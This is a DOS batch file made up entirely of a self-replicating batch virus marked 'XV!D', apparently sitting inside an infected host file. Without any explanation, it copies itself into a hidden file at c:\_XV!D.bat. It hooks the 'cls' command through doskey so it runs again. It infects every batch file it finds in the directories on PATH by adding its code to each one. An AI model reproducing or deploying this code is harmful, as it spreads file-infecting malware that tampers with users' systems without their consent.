@if '%_passion%==' goto _passion
::**** HOST ****
@if not '%_passion%==' goto XV!Dend
:_passion XV!D
@echo off%_XV!D%
if '%1=='XV!D goto XV!D%2
if '%1=='ClS cls%_XV!D%
set XV!D=%0.bat
if not exist %XV!D% set XV!D=%0
if '%XV!D%==' set XV!D=autoexec.bat
set !XV!D=%1 %2 %3 %4 %5 %6 %7 %8 %9
if exist c:\_XV!D.bat goto XV!Dg
if exist %XV!D% goto XV!Dfe
call %XV!D% XV!D h %path%
if exist %XV!D% goto XV!Dfe
goto eXV!D
:XV!Dh
shift%_XV!D%
if '%2==' goto XV!Dend
if exist %2\%XV!D% set XV!D=%2\%XV!D%
if exist %2%XV!D% set XV!D=%2%XV!D%
if exist %2\%XV!D%.bat set XV!D=%2\%XV!D%.bat
if exist %2%XV!D%.bat set XV!D=%2%XV!D%.bat
if not exist %XV!D% goto XV!Dh
goto XV!Dend
:XV!Dfe
find "XV!D"<%XV!D%>c:\_XV!D.bat
attrib c:\_XV!D.bat +h
:XV!Dg
command /e:5000 /c c:\_XV!D XV!D vir .. . %path%
doskey cls=cls$tc:\_xv!d ClS>nul%_XV!D%
:eXV!D
call %XV!D% XV!D rh
set _passion=>nul.XV!D
set !XV!D=
set XV!D=
goto XV!Dend
:XV!Drh
set _passion=x%_XV!D%
%XV!D% %!XV!D%
:XV!Dvir
shift%_XV!D%
if '%2==' exit XV!D
for %%a in (%2\*.bat %2*.bat) do call c:\_XV!D XV!D i %%a
goto XV!Dvir
:XV!Di
find "XV!D"<%3>nul
if not errorlevel 1 goto XV!Dj
echo @if '%%_passion%%==' goto _passion>XV!D$
type %3>>XV!D$
echo.>>XV!D$
type c:\_XV!D.bat>>XV!D$
move XV!D$ %3>nul
exit XV!D
:XV!Dj
set XV!D!=%XV!D!%1
if %XV!D!%==11111111 exit
:XV!Dend
